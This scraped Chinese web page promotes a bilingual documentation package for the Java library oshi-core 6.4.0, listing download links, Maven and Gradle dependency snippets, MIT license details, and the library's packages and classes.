.task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">完整文档下载地址（类、方法、参数说明）</h2>
<ul>
<li><strong>oshi-core-6.4.0.jar中文-英文对照文档.zip</strong> 下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhanshuixin.org%2Fresource%2FfileDetails%3FgroupId%3Dcom.github.oshi%26artifactId%3Doshi-core%26version%3D6.4.0" target="_blank" title="https://hanshuixin.org/resource/fileDetails?groupId=com.github.oshi&amp;artifactId=oshi-core&amp;version=6.4.0" ref="nofollow noopener noreferrer">hanshuixin.org/resource/fi…</a></li>
<li><strong>oshi-core 其他版本中文文档</strong> 下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhanshuixin.org%2Fresource%2F%3FgroupId%3Dcom.github.oshi%26artifactId%3Doshi-core" target="_blank" title="https://hanshuixin.org/resource/?groupId=com.github.oshi&amp;artifactId=oshi-core" ref="nofollow noopener noreferrer">hanshuixin.org/resource/?g…</a></li>
</ul>
<h2 data-id="heading-1">oshi-core-6.4.0.jar中文-英文对照文档.zip 中包含以下内容</h2>
<ol>
<li>中文-英文对照<strong>文档</strong>：位于压缩包内的“文档”文件夹中</li>
<li><strong>说明文件</strong>：使用说明.txt、README.md</li>
<li><strong>Maven</strong>依赖：oshi-core-6.4.0.jar Maven依赖信息(可用于项目pom.xml).txt</li>
<li><strong>Gradle</strong>依赖：oshi-core-6.4.0.jar Gradle依赖信息(可用于项目build.gradle).txt</li>
<li><strong>jar包</strong>下载地址：oshi-core-6.4.0.jar下载地址(官方地址+国内镜像地址).txt</li>
<li><strong>源码</strong>下载地址：oshi-core-6.4.0-sources.jar下载地址(官方地址+国内镜像地址).txt</li>
</ol>
<h2 data-id="heading-2">使用方法</h2>
<ol>
<li>解压 <strong>oshi-core-6.4.0.jar中文-英文对照文档.zip</strong>，找到 解压后的文件夹&gt;文档&gt;index.html，双击index.html即可用浏览器打开查看。</li>
<li>为了防止解压后路径太长导致浏览器无法打开，推荐在解压时选择“解压到当前文件夹”（放心，自带文件夹，文件不会散落一地）。</li>
<li>有时，一套Java组件会有多个jar，所以在下载前，请仔细阅读本篇描述，以确保这就是你需要的文件。</li>
</ol>
<h2 data-id="heading-3">组件信息</h2>
<h3 data-id="heading-4">简介</h3>
<ul>
<li><strong>名称：</strong> oshi-core</li>
<li><strong>描述：</strong> com.github.oshi - oshi-core</li>
<li><strong>版本：</strong> 6.4.0</li>
</ul>
<h3 data-id="heading-5">Maven依赖</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.oshi<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>oshi-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span> 
</code></pre>
<h3 data-id="heading-6">Gradle依赖</h3>
<pre><code class="hljs language-text" lang="text">Gradle:
	implementation group: 'com.github.oshi', name: 'oshi-core', version: '6.4.0'
Gradle (Short):
	implementation 'com.github.oshi:oshi-core:6.4.0'
Gradle (Kotlin):
	implementation("com.github.oshi:oshi-core:6.4.0") 
</code></pre>
<h2 data-id="heading-7">寒水馨 Java 组件中文文档系列说明</h2>
<ul>
<li>文档为 Java 组件的中文翻译文档</li>
<li>文档由 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fhanshuixin.org" target="_blank" title="https://hanshuixin.org" ref="nofollow noopener noreferrer">寒水馨</a></strong> 翻译整理，非官方版本</li>
<li>本系列文档获取地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhanshuixin.org" target="_blank" title="https://hanshuixin.org" ref="nofollow noopener noreferrer">hanshuixin.org</a></li>
<li>本文档为人性化翻译，精心制作，请放心使用</li>
<li>本文档为双语同时展示，一行原文、一行译文，可逐行对照，避免了原文/译文来回切换的麻烦</li>
<li>有原文可参照，不再担心翻译偏差误导</li>
<li>边学技术、边学英语</li>
<li>只翻译了该翻译的内容，如：注释、说明、描述、用法讲解 等</li>
<li>不该翻译的内容保持原样，如：类名、方法名、包名、类型、关键字、代码 等</li>
</ul>
<h2 data-id="heading-8">版权声明与来源信息</h2>
<p>本翻译文档基于以下开源项目制作，严格遵守各项目的开源许可证，并在此列出其版权归属与许可证信息。</p>
<ul>
<li>组件 GAV 坐标：com.github.oshi:oshi-core:6.4.0</li>
<li>原始项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fcentral.sonatype.com%2Fartifact%2Fcom.github.oshi%2Foshi-core%2F6.4.0" target="_blank" title="https://central.sonatype.com/artifact/com.github.oshi/oshi-core/6.4.0" ref="nofollow noopener noreferrer">central.sonatype.com/artifact/co…</a></li>
<li>许可证：SPDX-License-Identifier: MIT</li>
<li>许可证链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fopensource.org%2Flicenses%2FMIT" target="_blank" title="https://opensource.org/licenses/MIT" ref="nofollow noopener noreferrer">opensource.org/licenses/MI…</a></li>
<li>所有原始代码及注释版权归其原作者所有</li>
<li>本翻译内容的版权归 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fhanshuixin.org" target="_blank" title="https://hanshuixin.org" ref="nofollow noopener noreferrer">寒水馨</a></strong> 所有（© 2025 寒水馨），未经许可不得用于二次分发或再销售</li>
</ul>
<h2 data-id="heading-9">本组件包含的 Java package（包）</h2>
<pre><code class="hljs language-text" lang="text">oshi
oshi.annotation.concurrent
oshi.driver.linux
oshi.driver.linux.proc
oshi.driver.mac
oshi.driver.mac.disk
oshi.driver.mac.net
oshi.driver.unix
oshi.driver.unix.aix
oshi.driver.unix.aix.perfstat
oshi.driver.unix.freebsd
oshi.driver.unix.freebsd.disk
oshi.driver.unix.openbsd.disk
oshi.driver.unix.solaris
oshi.driver.unix.solaris.disk
oshi.driver.unix.solaris.kstat
oshi.driver.windows
oshi.driver.windows.perfmon
oshi.driver.windows.registry
oshi.driver.windows.wmi
oshi.hardware
oshi.hardware.common
oshi.hardware.platform.linux
oshi.hardware.platform.mac
oshi.hardware.platform.unix
oshi.hardware.platform.unix.aix
oshi.hardware.platform.unix.freebsd
oshi.hardware.platform.unix.openbsd
oshi.hardware.platform.unix.solaris
oshi.hardware.platform.windows
oshi.jna
oshi.jna.platform.linux
oshi.jna.platform.mac
oshi.jna.platform.unix
oshi.jna.platform.windows
oshi.software.common
oshi.software.os
oshi.software.os.linux
oshi.software.os.mac
oshi.software.os.unix.aix
oshi.software.os.unix.freebsd
oshi.software.os.unix.openbsd
oshi.software.os.unix.solaris
oshi.software.os.windows
oshi.util
oshi.util.platform.linux
oshi.util.platform.mac
oshi.util.platform.unix.freebsd
oshi.util.platform.unix.openbsd
oshi.util.platform.unix.solaris
oshi.util.platform.windows
oshi.util.tuples 
</code></pre>
<h2 data-id="heading-10">本组件包含的 Java class（类）</h2>
<pre><code class="hljs language-text" lang="text">oshi.PlatformEnum
oshi.SystemInfo
oshi.annotation.concurrent.GuardedBy
oshi.annotation.concurrent.Immutable
oshi.annotation.concurrent.NotThreadSafe
oshi.annotation.concurrent.ThreadSafe
oshi.driver.linux.Devicetree
oshi.driver.linux.Dmidecode
oshi.driver.linux.Lshal
oshi.driver.linux.Lshw
oshi.driver.linux.Sysfs
oshi.driver.linux.Who
oshi.driver.linux.proc.Auxv
oshi.driver.linux.proc.CpuInfo
oshi.driver.linux.proc.CpuStat
oshi.driver.linux.proc.DiskStats
oshi.driver.linux.proc.DiskStats.IoStat
oshi.driver.linux.proc.ProcessStat
oshi.driver.linux.proc.ProcessStat.PidStat
oshi.driver.linux.proc.ProcessStat.PidStatM
oshi.driver.linux.proc.UpTime
oshi.driver.mac.ThreadInfo
oshi.driver.mac.ThreadInfo.ThreadStats
oshi.driver.mac.Who
oshi.driver.mac.WindowInfo
oshi.driver.mac.disk.Fsstat
oshi.driver.mac.net.NetStat
oshi.driver.mac.net.NetStat.IFdata
oshi.driver.unix.NetStat
oshi.driver.unix.Who
oshi.driver.unix.Xrandr
oshi.driver.unix.Xwininfo
oshi.driver.unix.aix.Ls
oshi.driver.unix.aix.Lscfg
oshi.driver.unix.aix.Lspv
oshi.driver.unix.aix.Lssrad
oshi.driver.unix.aix.PsInfo
oshi.driver.unix.aix.Uptime
oshi.driver.unix.aix.Who
oshi.driver.unix.aix.perfstat.PerfstatConfig
oshi.driver.unix.aix.perfstat.PerfstatCpu
oshi.driver.unix.aix.perfstat.PerfstatDisk
oshi.driver.unix.aix.perfstat.PerfstatMemory
oshi.driver.unix.aix.perfstat.PerfstatNetInterface
oshi.driver.unix.aix.perfstat.PerfstatProcess
oshi.driver.unix.aix.perfstat.PerfstatProtocol
oshi.driver.unix.freebsd.Who
oshi.driver.unix.freebsd.disk.GeomDiskList
oshi.driver.unix.freebsd.disk.GeomPartList
oshi.driver.unix.freebsd.disk.Mount
oshi.driver.unix.openbsd.disk.Disklabel
oshi.driver.unix.solaris.PsInfo
oshi.driver.unix.solaris.Who
oshi.driver.unix.solaris.disk.Iostat
oshi.driver.unix.solaris.disk.Lshal
oshi.driver.unix.solaris.disk.Prtvtoc
oshi.driver.unix.solaris.kstat.SystemPages
oshi.driver.windows.DeviceTree
oshi.driver.windows.EnumWindows
oshi.driver.windows.LogicalProcessorInformation
oshi.driver.windows.perfmon.LoadAverage
oshi.driver.windows.perfmon.MemoryInformation
oshi.driver.windows.perfmon.MemoryInformation.PageSwapProperty
oshi.driver.windows.perfmon.PagingFile
oshi.driver.windows.perfmon.PagingFile.PagingPercentProperty
oshi.driver.windows.perfmon.PerfmonConstants
oshi.driver.windows.perfmon.PerfmonDisabled
oshi.driver.windows.perfmon.PhysicalDisk
oshi.driver.windows.perfmon.PhysicalDisk.PhysicalDiskProperty
oshi.driver.windows.perfmon.ProcessInformation
oshi.driver.windows.perfmon.ProcessInformation.HandleCountProperty
oshi.driver.windows.perfmon.ProcessInformation.IdleProcessorTimeProperty
oshi.driver.windows.perfmon.ProcessInformation.ProcessPerformanceProperty
oshi.driver.windows.perfmon.ProcessorInformation
oshi.driver.windows.perfmon.ProcessorInformation.InterruptsProperty
oshi.driver.windows.perfmon.ProcessorInformation.ProcessorFrequencyProperty
oshi.driver.windows.perfmon.ProcessorInformation.ProcessorTickCountProperty
oshi.driver.windows.perfmon.ProcessorInformation.ProcessorUtilityTickCountProperty
oshi.driver.windows.perfmon.SystemInformation
oshi.driver.windows.perfmon.SystemInformation.ContextSwitchProperty
oshi.driver.windows.perfmon.SystemInformation.ProcessorQueueLengthProperty
oshi.driver.windows.perfmon.ThreadInformation
oshi.driver.windows.perfmon.ThreadInformation.ThreadPerformanceProperty
oshi.driver.windows.registry.HkeyPerformanceDataUtil
oshi.driver.windows.registry.HkeyUserData
oshi.driver.windows.registry.NetSessionData
oshi.driver.windows.registry.ProcessPerformanceData
oshi.driver.windows.registry.ProcessPerformanceData.PerfCounterBlock
oshi.driver.windows.registry.ProcessWtsData
oshi.driver.windows.registry.ProcessWtsData.WtsInfo
oshi.driver.windows.registry.SessionWtsData
oshi.driver.windows.registry.ThreadPerformanceData
oshi.driver.windows.registry.ThreadPerformanceData.PerfCounterBlock
oshi.driver.windows.wmi.MSAcpiThermalZoneTemperature
oshi.driver.windows.wmi.MSAcpiThermalZoneTemperature.TemperatureProperty
oshi.driver.windows.wmi.MSFTStorage
oshi.driver.windows.wmi.MSFTStorage.PhysicalDiskProperty
oshi.driver.windows.wmi.MSFTStorage.StoragePoolProperty
oshi.driver.windows.wmi.MSFTStorage.StoragePoolToPhysicalDiskProperty
oshi.driver.windows.wmi.MSFTStorage.VirtualDiskProperty
oshi.driver.windows.wmi.OhmHardware
oshi.driver.windows.wmi.OhmHardware.IdentifierProperty
oshi.driver.windows.wmi.OhmSensor
oshi.driver.windows.wmi.OhmSensor.ValueProperty
oshi.driver.windows.wmi.Win32BaseBoard
oshi.driver.windows.wmi.Win32BaseBoard.BaseBoardProperty
oshi.driver.windows.wmi.Win32Bios
oshi.driver.windows.wmi.Win32Bios.BiosProperty
oshi.driver.windows.wmi.Win32Bios.BiosSerialProperty
oshi.driver.windows.wmi.Win32ComputerSystem
oshi.driver.windows.wmi.Win32ComputerSystem.ComputerSystemProperty
oshi.driver.windows.wmi.Win32ComputerSystemProduct
oshi.driver.windows.wmi.Win32ComputerSystemProduct.ComputerSystemProductProperty
oshi.driver.windows.wmi.Win32DiskDrive
oshi.driver.windows.wmi.Win32DiskDrive.DiskDriveProperty
oshi.driver.windows.wmi.Win32DiskDriveToDiskPartition
oshi.driver.windows.wmi.Win32DiskDriveToDiskPartition.DriveToPartitionProperty
oshi.driver.windows.wmi.Win32DiskPartition
oshi.driver.windows.wmi.Win32DiskPartition.DiskPartitionProperty
oshi.driver.windows.wmi.Win32Fan
oshi.driver.windows.wmi.Win32Fan.SpeedProperty
oshi.driver.windows.wmi.Win32LogicalDisk
oshi.driver.windows.wmi.Win32LogicalDisk.LogicalDiskProperty
oshi.driver.windows.wmi.Win32LogicalDiskToPartition
oshi.driver.windows.wmi.Win32LogicalDiskToPartition.DiskToPartitionProperty
oshi.driver.windows.wmi.Win32OperatingSystem
oshi.driver.windows.wmi.Win32OperatingSystem.OSVersionProperty
oshi.driver.windows.wmi.Win32PhysicalMemory
oshi.driver.windows.wmi.Win32PhysicalMemory.PhysicalMemoryProperty
oshi.driver.windows.wmi.Win32PhysicalMemory.PhysicalMemoryPropertyWin8
oshi.driver.windows.wmi.Win32Process
oshi.driver.windows.wmi.Win32Process.CommandLineProperty
oshi.driver.windows.wmi.Win32Process.ProcessXPProperty
oshi.driver.windows.wmi.Win32ProcessCached
oshi.driver.windows.wmi.Win32Processor
oshi.driver.windows.wmi.Win32Processor.BitnessProperty
oshi.driver.windows.wmi.Win32Processor.ProcessorIdProperty
oshi.driver.windows.wmi.Win32Processor.VoltProperty
oshi.driver.windows.wmi.Win32VideoController
oshi.driver.windows.wmi.Win32VideoController.VideoControllerProperty
oshi.hardware.Baseboard
oshi.hardware.CentralProcessor
oshi.hardware.CentralProcessor.LogicalProcessor
oshi.hardware.CentralProcessor.PhysicalProcessor
oshi.hardware.CentralProcessor.ProcessorCache
oshi.hardware.CentralProcessor.ProcessorCache.Type
oshi.hardware.CentralProcessor.ProcessorIdentifier
oshi.hardware.CentralProcessor.TickType
oshi.hardware.ComputerSystem
oshi.hardware.Display
oshi.hardware.Firmware
oshi.hardware.GlobalMemory
oshi.hardware.GraphicsCard
oshi.hardware.HWDiskStore
oshi.hardware.HWPartition
oshi.hardware.HardwareAbstractionLayer
oshi.hardware.LogicalVolumeGroup
oshi.hardware.NetworkIF
oshi.hardware.NetworkIF.IfOperStatus
oshi.hardware.PhysicalMemory
oshi.hardware.PowerSource
oshi.hardware.PowerSource.CapacityUnits
oshi.hardware.Sensors
oshi.hardware.SoundCard
oshi.hardware.UsbDevice
oshi.hardware.VirtualMemory
oshi.hardware.common.AbstractBaseboard
oshi.hardware.common.AbstractCentralProcessor
oshi.hardware.common.AbstractComputerSystem
oshi.hardware.common.AbstractDisplay
oshi.hardware.common.AbstractFirmware
oshi.hardware.common.AbstractGlobalMemory
oshi.hardware.common.AbstractGraphicsCard
oshi.hardware.common.AbstractHWDiskStore
oshi.hardware.common.AbstractHardwareAbstractionLayer
oshi.hardware.common.AbstractLogicalVolumeGroup
oshi.hardware.common.AbstractNetworkIF
oshi.hardware.common.AbstractPowerSource
oshi.hardware.common.AbstractSensors
oshi.hardware.common.AbstractSoundCard
oshi.hardware.common.AbstractUsbDevice
oshi.hardware.common.AbstractVirtualMemory
oshi.hardware.platform.linux.LinuxGlobalMemory
oshi.hardware.platform.linux.LinuxHWDiskStore
oshi.hardware.platform.linux.LinuxHardwareAbstractionLayer
oshi.hardware.platform.linux.LinuxNetworkIF
oshi.hardware.platform.linux.LinuxPowerSource
oshi.hardware.platform.linux.LinuxUsbDevice
oshi.hardware.platform.mac.MacHWDiskStore
oshi.hardware.platform.mac.MacHardwareAbstractionLayer
oshi.hardware.platform.mac.MacNetworkIF
oshi.hardware.platform.mac.MacPowerSource
oshi.hardware.platform.mac.MacUsbDevice
oshi.hardware.platform.unix.BsdNetworkIF
oshi.hardware.platform.unix.UnixBaseboard
oshi.hardware.platform.unix.UnixDisplay
oshi.hardware.platform.unix.aix.AixHWDiskStore
oshi.hardware.platform.unix.aix.AixHardwareAbstractionLayer
oshi.hardware.platform.unix.aix.AixNetworkIF
oshi.hardware.platform.unix.aix.AixPowerSource
oshi.hardware.platform.unix.aix.AixUsbDevice
oshi.hardware.platform.unix.freebsd.FreeBsdHWDiskStore
oshi.hardware.platform.unix.freebsd.FreeBsdHardwareAbstractionLayer
oshi.hardware.platform.unix.freebsd.FreeBsdPowerSource
oshi.hardware.platform.unix.freebsd.FreeBsdUsbDevice
oshi.hardware.platform.unix.openbsd.OpenBsdCentralProcessor
oshi.hardware.platform.unix.openbsd.OpenBsdComputerSystem
oshi.hardware.platform.unix.openbsd.OpenBsdFirmware
oshi.hardware.platform.unix.openbsd.OpenBsdHWDiskStore
oshi.hardware.platform.unix.openbsd.OpenBsdHardwareAbstractionLayer
oshi.hardware.platform.unix.openbsd.OpenBsdPowerSource
oshi.hardware.platform.unix.openbsd.OpenBsdUsbDevice
oshi.hardware.platform.unix.solaris.SolarisHWDiskStore
oshi.hardware.platform.unix.solaris.SolarisHardwareAbstractionLayer
oshi.hardware.platform.unix.solaris.SolarisNetworkIF
oshi.hardware.platform.unix.solaris.SolarisPowerSource
oshi.hardware.platform.unix.solaris.SolarisUsbDevice
oshi.hardware.platform.windows.WindowsHWDiskStore
oshi.hardware.platform.windows.WindowsHardwareAbstractionLayer
oshi.hardware.platform.windows.WindowsNetworkIF
oshi.hardware.platform.windows.WindowsPowerSource
oshi.hardware.platform.windows.WindowsUsbDevice
oshi.jna.ByRef
oshi.jna.ByRef.CloseableHANDLEByReference
oshi.jna.ByRef.CloseableIntByReference
oshi.jna.ByRef.CloseableLONGLONGByReference
oshi.jna.ByRef.CloseableLongByReference
oshi.jna.ByRef.CloseableNativeLongByReference
oshi.jna.ByRef.CloseablePROCESSENTRY32ByReference
oshi.jna.ByRef.CloseablePointerByReference
oshi.jna.ByRef.CloseableSizeTByReference
oshi.jna.ByRef.CloseableULONGptrByReference
oshi.jna.Struct
oshi.jna.Struct.CloseableHostCpuLoadInfo
oshi.jna.Struct.CloseableMibIfRow
oshi.jna.Struct.CloseableMibIfRow2
oshi.jna.Struct.CloseableMibTcpStats
oshi.jna.Struct.CloseableMibUdpStats
oshi.jna.Struct.CloseablePdhRawCounter
oshi.jna.Struct.CloseablePerformanceInformation
oshi.jna.Struct.CloseableProcTaskAllInfo
oshi.jna.Struct.CloseableProcTaskInfo
oshi.jna.Struct.CloseableRUsageInfoV2
oshi.jna.Struct.CloseableSpDeviceInterfaceData
oshi.jna.Struct.CloseableSpDevinfoData
oshi.jna.Struct.CloseableSysinfo
oshi.jna.Struct.CloseableSystemInfo
oshi.jna.Struct.CloseableTimeval
oshi.jna.Struct.CloseableVMStatistics
oshi.jna.Struct.CloseableVnodePathInfo
oshi.jna.Struct.CloseableXswUsage
oshi.jna.platform.linux.LinuxLibc
oshi.jna.platform.linux.LinuxLibc.Exit_status
oshi.jna.platform.linux.LinuxLibc.LinuxUtmpx
oshi.jna.platform.linux.LinuxLibc.Ut_Tv
oshi.jna.platform.mac.CoreGraphics
oshi.jna.platform.mac.CoreGraphics.CGPoint
oshi.jna.platform.mac.CoreGraphics.CGRect
oshi.jna.platform.mac.CoreGraphics.CGSize
oshi.jna.platform.mac.IOKit
oshi.jna.platform.mac.IOKit.SMCKeyData
oshi.jna.platform.mac.IOKit.SMCKeyDataKeyInfo
oshi.jna.platform.mac.IOKit.SMCKeyDataPLimitData
oshi.jna.platform.mac.IOKit.SMCKeyDataVers
oshi.jna.platform.mac.IOKit.SMCVal
oshi.jna.platform.mac.SystemB
oshi.jna.platform.mac.SystemB.InSockInfo
oshi.jna.platform.mac.SystemB.MacUtmpx
oshi.jna.platform.mac.SystemB.Pri
oshi.jna.platform.mac.SystemB.ProcFdInfo
oshi.jna.platform.mac.SystemB.ProcFileInfo
oshi.jna.platform.mac.SystemB.SocketFdInfo
oshi.jna.platform.mac.SystemB.SocketInfo
oshi.jna.platform.mac.SystemB.TcpSockInfo
oshi.jna.platform.mac.SystemConfiguration
oshi.jna.platform.mac.SystemConfiguration.SCNetworkInterfaceRef
oshi.jna.platform.unix.AixLibc
oshi.jna.platform.unix.AixLibc.AixLwpsInfo
oshi.jna.platform.unix.AixLibc.AixPsInfo
oshi.jna.platform.unix.AixLibc.Timestruc
oshi.jna.platform.unix.CLibrary
oshi.jna.platform.unix.CLibrary.Addrinfo
oshi.jna.platform.unix.CLibrary.Addrinfo.ByReference
oshi.jna.platform.unix.CLibrary.BsdIp6stat
oshi.jna.platform.unix.CLibrary.BsdIpstat
oshi.jna.platform.unix.CLibrary.BsdTcpstat
oshi.jna.platform.unix.CLibrary.BsdUdpstat
oshi.jna.platform.unix.CLibrary.Sockaddr
oshi.jna.platform.unix.CLibrary.Sockaddr.ByReference
oshi.jna.platform.unix.FreeBsdLibc
oshi.jna.platform.unix.FreeBsdLibc.CpTime
oshi.jna.platform.unix.FreeBsdLibc.FreeBsdUtmpx
oshi.jna.platform.unix.FreeBsdLibc.Timeval
oshi.jna.platform.unix.OpenBsdLibc
oshi.jna.platform.unix.OpenBsdLibc.Bcachestats
oshi.jna.platform.unix.OpenBsdLibc.Timeval
oshi.jna.platform.unix.SolarisLibc
oshi.jna.platform.unix.SolarisLibc.Exit_status
oshi.jna.platform.unix.SolarisLibc.SolarisLwpsInfo
oshi.jna.platform.unix.SolarisLibc.SolarisPrUsage
oshi.jna.platform.unix.SolarisLibc.SolarisPsInfo
oshi.jna.platform.unix.SolarisLibc.SolarisUtmpx
oshi.jna.platform.unix.SolarisLibc.Timestruc
oshi.jna.platform.unix.SolarisLibc.Timeval
oshi.jna.platform.windows.NtDll
oshi.jna.platform.windows.NtDll.CURDIR
oshi.jna.platform.windows.NtDll.PEB
oshi.jna.platform.windows.NtDll.PROCESS_BASIC_INFORMATION
oshi.jna.platform.windows.NtDll.RTL_DRIVE_LETTER_CURDIR
oshi.jna.platform.windows.NtDll.RTL_USER_PROCESS_PARAMETERS
oshi.jna.platform.windows.NtDll.STRING
oshi.jna.platform.windows.NtDll.UNICODE_STRING
oshi.jna.platform.windows.PowrProf
oshi.jna.platform.windows.PowrProf.BATTERY_INFORMATION
oshi.jna.platform.windows.PowrProf.BATTERY_MANUFACTURE_DATE
oshi.jna.platform.windows.PowrProf.BATTERY_QUERY_INFORMATION
oshi.jna.platform.windows.PowrProf.BATTERY_QUERY_INFORMATION_LEVEL
oshi.jna.platform.windows.PowrProf.BATTERY_STATUS
oshi.jna.platform.windows.PowrProf.BATTERY_WAIT_STATUS
oshi.jna.platform.windows.PowrProf.ProcessorPowerInformation
oshi.jna.platform.windows.PowrProf.SystemBatteryState
oshi.jna.platform.windows.WinNT
oshi.jna.platform.windows.WinNT.TOKEN_ELEVATION
oshi.software.common.AbstractFileSystem
oshi.software.common.AbstractInternetProtocolStats
oshi.software.common.AbstractNetworkParams
oshi.software.common.AbstractOSFileStore
oshi.software.common.AbstractOSProcess
oshi.software.common.AbstractOSThread
oshi.software.common.AbstractOperatingSystem
oshi.software.os.FileSystem
oshi.software.os.InternetProtocolStats
oshi.software.os.InternetProtocolStats.IPConnection
oshi.software.os.InternetProtocolStats.TcpState
oshi.software.os.InternetProtocolStats.TcpStats
oshi.software.os.InternetProtocolStats.UdpStats
oshi.software.os.NetworkParams
oshi.software.os.OSDesktopWindow
oshi.software.os.OSFileStore
oshi.software.os.OSProcess
oshi.software.os.OSProcess.State
oshi.software.os.OSService
oshi.software.os.OSService.State
oshi.software.os.OSSession
oshi.software.os.OSThread
oshi.software.os.OSThread.ThreadFiltering
oshi.software.os.OperatingSystem
oshi.software.os.OperatingSystem.OSVersionInfo
oshi.software.os.OperatingSystem.ProcessFiltering
oshi.software.os.OperatingSystem.ProcessSorting
oshi.software.os.linux.LinuxFileSystem
oshi.software.os.linux.LinuxInternetProtocolStats
oshi.software.os.linux.LinuxOSFileStore
oshi.software.os.linux.LinuxOSProcess
oshi.software.os.linux.LinuxOSThread
oshi.software.os.linux.LinuxOperatingSystem
oshi.software.os.mac.MacFileSystem
oshi.software.os.mac.MacInternetProtocolStats
oshi.software.os.mac.MacOSFileStore
oshi.software.os.mac.MacOSProcess
oshi.software.os.mac.MacOSThread
oshi.software.os.mac.MacOperatingSystem
oshi.software.os.unix.aix.AixFileSystem
oshi.software.os.unix.aix.AixInternetProtocolStats
oshi.software.os.unix.aix.AixOSFileStore
oshi.software.os.unix.aix.AixOSProcess
oshi.software.os.unix.aix.AixOSThread
oshi.software.os.unix.aix.AixOperatingSystem
oshi.software.os.unix.freebsd.FreeBsdFileSystem
oshi.software.os.unix.freebsd.FreeBsdInternetProtocolStats
oshi.software.os.unix.freebsd.FreeBsdOSFileStore
oshi.software.os.unix.freebsd.FreeBsdOSProcess
oshi.software.os.unix.freebsd.FreeBsdOSThread
oshi.software.os.unix.freebsd.FreeBsdOperatingSystem
oshi.software.os.unix.openbsd.OpenBsdFileSystem
oshi.software.os.unix.openbsd.OpenBsdInternetProtocolStats
oshi.software.os.unix.openbsd.OpenBsdNetworkParams
oshi.software.os.unix.openbsd.OpenBsdOSFileStore
oshi.software.os.unix.openbsd.OpenBsdOSProcess
oshi.software.os.unix.openbsd.OpenBsdOSThread
oshi.software.os.unix.openbsd.OpenBsdOperatingSystem
oshi.software.os.unix.solaris.SolarisFileSystem
oshi.software.os.unix.solaris.SolarisInternetProtocolStats
oshi.software.os.unix.solaris.SolarisOSFileStore
oshi.software.os.unix.solaris.SolarisOSProcess
oshi.software.os.unix.solaris.SolarisOSThread
oshi.software.os.unix.solaris.SolarisOperatingSystem
oshi.software.os.windows.WindowsFileSystem
oshi.software.os.windows.WindowsInternetProtocolStats
oshi.software.os.windows.WindowsOSFileStore
oshi.software.os.windows.WindowsOSProcess
oshi.software.os.windows.WindowsOSThread
oshi.software.os.windows.WindowsOperatingSystem
oshi.util.Constants
oshi.util.EdidUtil
oshi.util.ExecutingCommand
oshi.util.FileSystemUtil
oshi.util.FileUtil
oshi.util.FormatUtil
oshi.util.GlobalConfig
oshi.util.GlobalConfig.PropertyException
oshi.util.Memoizer
oshi.util.ParseUtil
oshi.util.UserGroupInfo
oshi.util.Util
oshi.util.platform.linux.ProcPath
oshi.util.platform.mac.CFUtil
oshi.util.platform.mac.SmcUtil
oshi.util.platform.mac.SysctlUtil
oshi.util.platform.unix.freebsd.BsdSysctlUtil
oshi.util.platform.unix.freebsd.ProcstatUtil
oshi.util.platform.unix.openbsd.FstatUtil
oshi.util.platform.unix.openbsd.OpenBsdSysctlUtil
oshi.util.platform.unix.solaris.KstatUtil
oshi.util.platform.unix.solaris.KstatUtil.KstatChain
oshi.util.platform.windows.PerfCounterQuery
oshi.util.platform.windows.PerfCounterQuery.PdhCounterProperty
oshi.util.platform.windows.PerfCounterQueryHandler
oshi.util.platform.windows.PerfCounterWildcardQuery
oshi.util.platform.windows.PerfCounterWildcardQuery.PdhCounterWildcardProperty
oshi.util.platform.windows.PerfDataUtil
oshi.util.platform.windows.PerfDataUtil.PerfCounter
oshi.util.platform.windows.WmiQueryHandler
oshi.util.platform.windows.WmiUtil
oshi.util.tuples.Pair
oshi.util.tuples.Quartet
oshi.util.tuples.Quintet
oshi.util.tuples.Triplet 
</code></pre>
<h2 data-id="heading-11">完整文档下载地址（类、方法、参数说明）</h2>
<ul>
